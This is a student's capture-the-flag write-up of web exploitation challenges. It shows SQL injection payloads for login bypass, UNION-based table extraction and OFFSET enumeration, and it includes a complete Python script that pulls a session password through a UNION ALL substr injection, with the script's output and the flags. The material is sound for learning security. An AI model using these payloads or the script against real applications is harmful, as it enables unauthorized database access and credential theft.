# Web Exploitation 

## Database Incursion 2.0 
In this challenge, we had to look around a database and try to gain access to admin area which would allow us to find the flag. 

### Solution 
To solve this challenge, I followed the steps as given below: 
- I first opened the google drive to find the link and open the login page. This was pretty similar to a challenge we had solved in Citadel-CTF.
- Using similar reasoning, I logged in without facing much issues.
![Image of Login page with `' OR 1=1 --`](/images/custom/WebEx/Screenshot-2025-11-05-19-40-06.png)
- After logging in, I looked around to see that Drake was telling me that someone from management has the passcode. Again using similar logic that I used in Citadel, I set `OFFSET` to find the person with the password so I could acess Admin Area
![Image of Searching name with `' OR 1=1 LIMIT 4 OFFSET 10 --`](/images/custom/WebEx/Screenshot-2025-11-05-19-41-58.png)
- This gave me the passcode to move onto the next stage. Here is where things got interesting. Now because there were multiple tables, I had to go and read through resources to understand how exactly we can acess tables. Here I stumbled across the `UNION` keyword. I used this to try to get data from `metadata` table. Luckily it worked on my first try.
- However, when I tried accessing data from the `CITADEL_ARCHIVE_2077` it was not allowing me to access the data and showing an error as below:
![Image of columns not matching](/images/custom/WebEx/Screenshot-2025-11-05-19-43-41.png)
- It took me a while to understand what was happening, and I had to read up properly on the `UNION` command. What I learned after some reasearch is that `UNION` needs to have the same number of columns on both sides of the command, but the error was showing that there were not equal columns on each side.
- Hence I tried various methods of trying to find out the column names of the `CITADEL_ARCHIVE_2077` table, without much gain. (More in Notes)
- I came across some article which mentioned that we could also leave the column names as empty. Then it struck me all of a sudden that on reading the `Revenue` column, we had something called `secrets` in it. This could be a column name.
- Using this as an insight I crafted a query as shown to get the flag:
![Image of `' UNION SELECT secrets, NULL, NULL, NULL from CITADEL_ARCHIVE_2077`](/images/custom/WebEx/Screenshot-2025-11-05-19-45-29.png)

### Flag 
`CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}`

### Notes 
1. I tried using `PRAGMA table_info()` but that was just useless.
2. I tried using `DESCRIBE` as well, but same issue as above.
3. I tired using `;` but we could only pass one query at a time, not multiple.

### What I learned
From this challenge, I learned about how to use `UNION` properly to access details from other tables and display it. This is a really fruitful thing to know, espeically when we are sure that we are in a database, but need to find information about other tables. The usage of `NULL` to fill out the extra columns was really amazing, and honestly quite impressive, yet logical. 

### References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- https://www.w3schools.com/sql/sql_union.asp
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Temporal Token 

-----------------------------------------------------------------------------------------------------------------------------------
## Oneshot 
In this challenge, we had to work on a unique was of SQLi and get the password extracted. 

### Solution 
To solve this challenge, I followed the steps as given below: 
- I first downloaded the source code and then analyzed it well. From this I learned, that every time we clicked on new session, we generated a new table and a new password, hence the name oneshot.
- On analyzing it more, I learned that we could make exactly one HTTP Request to get the password out. The password being a random collection of characters could not be extracted out simply. This was because only the first letter of the row was being shown everytime with the rest of being changed to `*`.
- This gave me the idea of trying to get each character of the password at the start of the row, meaning I would get more rows, but each character at the start of the row would become a part of the password. To do so, I first worked on trying to make a query which would allow us to get this password, but then switched to scripting since scripting was easier. This is elaborated more in notes.
- The final working script was as below:
```bash
import requests
import re

URL = "https://pacman-git-master-mrrobot404s-projects.vercel.app/"

def solve():
    s = requests.Session()

    print("[*] Starting session...")
    try:
        r = s.post(f"{URL}/new_session")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    match = re.search(r'name="id" value="([a-f0-9]{16})"', r.text)
    if not match:
        print("[-] Could not find Session ID. Server might be down or layout changed.")
        print(f"Debug Response: {r.text[:200]}")
        return
    
    sess_id = match.group(1)
    table_name = f"table_{sess_id}"
    print(f"[+] Got Session ID: {sess_id}")
    print(f"[+] Target Table: {table_name}")

    parts = []
    for i in range(1, 33):
        parts.append(f"SELECT substr(password, {i}) FROM {table_name}")
    
    payload = f"'AND 0 UNION ALL {' UNION ALL '.join(parts)} --"

    print("[*] Sending injection...")
    r = s.post(f"{URL}/search", data={
        "id": sess_id,
        "query": payload
    })

    if "that table is gone" in r.text:
        print("[-] Error: 'That table is gone'.")
        print("    If this happens immediately, the server is resetting the DB (Serverless issue).")
        return

    results = re.findall(r"<li>(.)", r.text)
    
    if not results:
        print("[-] Injection failed. No results found.")
        print(f"Debug Response: {r.text[:300]}")
        return

    password = "".join(results)
    print(f"[+] Recovered Password: {password}")

    print("[*] Submitting guess...")
    r = s.post(f"{URL}/guess", data={
        "id": sess_id,
        "password": password
    })

    if "flag" in r.text or "{" in r.text:
        print("\n" + "="*40)
        print(f"WIN! Response:\n{r.text}")
        print("="*40)
    else:
        print("[-] Failed to get flag.")
        print(r.text)

if __name__ == "__main__":
    solve()

```
- This code actually had some flaws initially, and they are mentioned in the notes.
- On running the code, I got the output as below:
```bash
 ⚙  Sat  6 Dec - 21:24  ~/Downloads 
 @ishaan-mishra  python3 exploit.py
[*] Starting session...
[+] Got Session ID: 1de4760b0572eb9c
[+] Target Table: table_1de4760b0572eb9c
[*] Sending injection...
[+] Recovered Password: 6550a1ad38ed07b80c9ea488e923fe26
[*] Submitting guess...

========================================
WIN! Response:
nite{are_you_feeling_the_heat_now :)}
========================================
```

### Flag 
`nite{are_you_feeling_the_heat_now :)}`

### What I learned 
From this challenge, I learned about the `requests` library that was used to directly connect to the website and solve the challenge. I also learned about how the queries can be injected, and how we need to carefully analyze the source code to solve any problem. 

### Notes
1. I initally tried out making a query directly to the website, but I was not able to find the correct table id. Even after using the Developer's Tools, it kept on showing me that the table was gone.
2. When I was writing the code, for some reason, I was not able to get the correct password. I actually spent a lot of time on this code and then I searched online to learn that this code was repeating the first character a twice, i.e, ` payload = f"' UNION ALL {' UNION ALL '.join(parts)} --" ` was a wrong line in the script. To fix this I had to add `AND 0` to the script to be able to make the correct password. This got me the password and ultimately the flag.

### References
- https://drive.google.com/drive/folders/1DvyHsg_e_tA7b4mqh3RBXszaxlkxd9go
- https://www.infosecinstitute.com/resources/secure-coding/attacking-web-applications-with-python-exploiting-web-forms-and-requests/
----------------------------------------------------------------------------------------------------------------------------------
